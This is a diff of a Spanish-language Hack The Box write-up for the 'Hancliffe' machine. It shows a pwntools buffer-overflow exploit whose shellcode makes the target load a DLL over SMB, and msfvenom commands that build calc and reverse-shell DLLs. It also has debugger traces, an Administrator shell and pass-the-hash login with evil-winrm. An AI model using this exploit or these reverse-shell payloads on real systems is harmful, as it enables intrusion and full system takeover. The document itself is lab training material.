+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, log, sys, p32, asm
+
+</span><span class="o">if </span><span class="no">len</span><span class="p">(sys.argv) </span><span class="o">< </span><span class="mi">2</span><span class="p">:
+    log.failure(</span><span class="no">f</span><span class="s">"Usage: python3 </span><span class="p">{sys.argv[</span><span class="mi">0</span><span class="p">]}</span><span class="s"> &ltport>"</span><span class="p">)
+    sys.exit(</span><span class="mi">1</span><span class="p">)
+
+smb</span><span class="o"> =</span><span class="no"> b</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">192.168.233.129</span><span class="mi">\\</span><span class="s">user</span><span class="mi">\\</span><span class="s">shell.dll"</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">].hex()  
+
+dll  </span><span class="o">=</span><span class="no"> b</span><span class="s">""</span><span class="p">
+dll</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"sub esp, 0x64"</span><span class="p">)
+dll</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"xor ebx, ebx"</span><span class="p">)
+dll</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push ebx"</span><span class="p">)
+
+for</span><span class="p"> i</span><span class="o"> in</span><span class="no"> range</span><span class="p">(</span><span class="mi">0</span><span class="p">, </span><span class="no">len</span><span class="p">(smb), </span><span class="mi">8</span><span class="p">):
+     dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"push 0x"</span><span class="o"> +</span><span class="p"> smb[i:</span><span class="mi">8</span><span class="o">+</span><span class="p">i])
+
+dll</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push esp"</span><span class="p">)
+dll</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"call [0x719081c8]"</span><span class="p">)
+
+offset</span><span class="o"> =</span><span class="mi"> 66</span><span class="p">
+junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> (offset </span><span class="o">- </span><span class="no">len</span><span class="p">(dll))
+
+jmpeax</span><span class="o"> =</span><span class="p"> p32(</span><span class="mi">0x719023b3</span><span class="p">)
+
+payload</span><span class="o"> =</span><span class="p"> dll </span><span class="o">+ </span><span class="p">junk</span><span class="o"> +</span><span class="p"> jmpeax
+
+shell</span><span class="o"> = </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, sys.argv[</span><span class="mi">1</span><span class="p">])
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"Username: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"alfiansyah"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"Password: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"K3r4j@@nM4j@pAh!T"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"FullName: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"Vickry Alfiansyah"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"Input Your Code: "</span><span class="p">, payload)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para probar en local creamos con <code class="language-plaintext highlighter-rouge">msfvenom</code> un dll que al cargarse ejecute una calculadora, luego lo compartimos en un recurso usando <code class="language-plaintext highlighter-rouge">smbserver</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ msfvenom</span><span class="p"> -p windows/exec CMD=calc.exe -f dll -o shell.dll
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload  
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 193 bytes
+Final size of dll file: 9216 bytes
+Saved as: shell.dll
+
+</span><span class="ve">❯ impacket-smbserver</span><span class="p"> user . -smb2support
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos ver como se comporta en el debugger, al terminar los push de la string la ruta <code class="language-plaintext highlighter-rouge">smb</code> se encuentra en el stack y al empujar <code class="language-plaintext highlighter-rouge">esp</code> ahora en el stack se encuentra el puntero a esa string y ese será el argumento a la funcion <code class="language-plaintext highlighter-rouge">LoadLibraryA</code>, si solo continuamos con la ejecución se carga la libreria maliciosa y se abre la calculadora</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> bp 0x719023b3
+
+</span><span class="ro">0:000></span><span class="p"> g
+Breakpoint 0 hit
+eax=0127fed6 ebx=00000138 ecx=00e73da0 edx=000a7190 esi=71901a3d edi=71901a3d  
+eip=719023b3 esp=0127ff1c ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
+MyFirstApp+0x23b3:
+719023b3 ffe0            jmp     eax {0127fed6}
+
+</span><span class="ro">0:000></span><span class="p"> u eax Ld
+0127fed6 83ec64          sub     esp,64h
+0127fed9 31db            xor     ebx,ebx
+0127fedb 53              push    ebx
+0127fedc 682e646c6c      push    6C6C642Eh
+0127fee1 6868656c6c      push    6C6C6568h
+0127fee6 6865725c73      push    735C7265h
+0127feeb 68395c7573      push    73755C39h
+0127fef0 68332e3132      push    32312E33h
+0127fef5 68382e3233      push    33322E38h
+0127fefa 68322e3136      push    36312E32h
+0127feff 685c5c3139      push    39315C5Ch
+0127ff04 54              push    esp
+0127ff05 ff15c8819071    call    dword ptr [MyFirstApp+0x81c8 (719081c8)]
+
+</span><span class="ro">0:000></span><span class="p"> g 0x0127ff04
+eax=0127fed6 ebx=00000000 ecx=00e73da0 edx=000a7190 esi=71901a3d edi=71901a3d
+eip=0127ff04 esp=0127fe94 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+0127ff04 54              push    esp
+
+</span><span class="ro">0:000></span><span class="p"> da esp
+0127fe94  "\\192.168.233.129\user\shell.dll"
+
+</span><span class="ro">0:000></span><span class="p"> p
+eax=0127fed6 ebx=00000000 ecx=00e73da0 edx=000a7190 esi=71901a3d edi=71901a3d
+eip=0127ff05 esp=0127fe90 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+0127ff05 ff15c8819071    call    dword ptr [MyFirstApp+0x81c8 (719081c8)] ds:002b:719081c8={KERNEL32!LoadLibraryAStub (778c0ed0)}  
+
+</span><span class="ro">0:000></span><span class="p"> da poi(esp)
+0127fe94  "\\192.168.233.129\user\shell.dll"</span>
+</code></pre></div></div><br>
+
+<a href="/hackthebox/hancliffe/29.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/29.png"></p></div></a>
+
+<p class="plain-text">Ahora que funciona simplemente creamos un nuevo <code class="language-plaintext highlighter-rouge">.dll</code> pero en lugar de una calculadora envia una <code class="language-plaintext highlighter-rouge">revshell</code> a nuestro equipo, en el exploit simplemente modificamos la ruta y la dirección ip a la máquina victima por el puerto <code class="language-plaintext highlighter-rouge">9999</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ msfvenom </span><span class="p">-p windows/shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f dll -o shell.dll  
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 1786 bytes
+Final size of dll file: 9216 bytes
+Saved as: shell.dll
+
+</span><span class="ve">❯ impacket-smbserver </span><span class="p">user . -smb2support
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote, p32, asm
+
+smb</span><span class="o"> =</span><span class="no"> b</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">10.10.10.10</span><span class="mi">\\</span><span class="s">user</span><span class="mi">\\</span><span class="s">shell.dll"</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">].hex()  
+
+dll  </span><span class="o">=</span><span class="no"> b</span><span class="s">""</span><span class="p">
+dll</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"sub esp, 0x64"</span><span class="p">)
+dll</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"xor ebx, ebx"</span><span class="p">)
+dll</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push ebx"</span><span class="p">)
+
+for</span><span class="p"> i</span><span class="o"> in</span><span class="no"> range</span><span class="p">(</span><span class="mi">0</span><span class="p">, </span><span class="no">len</span><span class="p">(smb), </span><span class="mi">8</span><span class="p">):
+     dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"push 0x"</span><span class="o"> +</span><span class="p"> smb[i:</span><span class="mi">8</span><span class="o">+</span><span class="p">i])
+
+dll</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push esp"</span><span class="p">)
+dll</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"call [0x719081c8]"</span><span class="p">)
+
+offset</span><span class="o"> =</span><span class="mi"> 66</span><span class="p">
+junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> (offset </span><span class="o">- </span><span class="no">len</span><span class="p">(dll))
+
+jmpeax</span><span class="o"> =</span><span class="p"> p32(</span><span class="mi">0x719023b3</span><span class="p">)
+
+payload</span><span class="o"> =</span><span class="p"> dll </span><span class="o">+ </span><span class="p">junk</span><span class="o"> +</span><span class="p"> jmpeax
+
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"10.10.11.115"</span><span class="p">,</span><span class="mi"> 9999</span><span class="p">)
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"Username: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"alfiansyah"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"Password: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"K3r4j@@nM4j@pAh!T"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"FullName: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"Vickry Alfiansyah"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"Input Your Code: "</span><span class="p">, payload)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Enviamos el exploit a la maquina que corre el servicio en el puerto <code class="language-plaintext highlighter-rouge">9999</code> y recibimos una shell como <code class="language-plaintext highlighter-rouge">Administrator</code> donde podemos leer la ultima flag de root</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] Opening connection to 10.10.11.115 on port 9999: Done
+[</span><span class="az">*</span><span class="p">] Closed connection to 10.10.11.115 port 9999</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.115
+Microsoft Windows [Version 10.0.19043.1266]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> </span><span class="am">whoami</span><span class="p">
+hancliffe\administrator
+
+C:\Windows\system32> </span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\root.txt
 7cc**************************564
 
 C:\Windows\system32></span>
@@ -1327,7 +1809,7 @@ C:\ProgramData></span>
 
 <p class="plain-text">Aprovechando el proxy que creamos antes podemos conectarnos por <code class="language-plaintext highlighter-rouge">winrm</code> haciendo un passthehash y obtenemos una <code class="language-plaintext highlighter-rouge">powershell</code> mucho mas interactiva</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ proxychains </span><span class="p">-q evil-winrm -i hancliffe.htb -u Administrator -H 2e5e9a333abf90ec9673220eb3befb83  
+<code><span class="ve">❯ proxychains </span><span class="p">-q evil-winrm -i 10.10.11.115 -u Administrator -H 2e5e9a333abf90ec9673220eb3befb83  
 PS C:\Users\Administrator\Documents> </span><span class="am">whoami</span><span class="p">
 hancliffe\administrator
 PS C:\Users\Administrator\Documents> </span><span class="am">type </span><span class="p">..\Desktop\root.txt
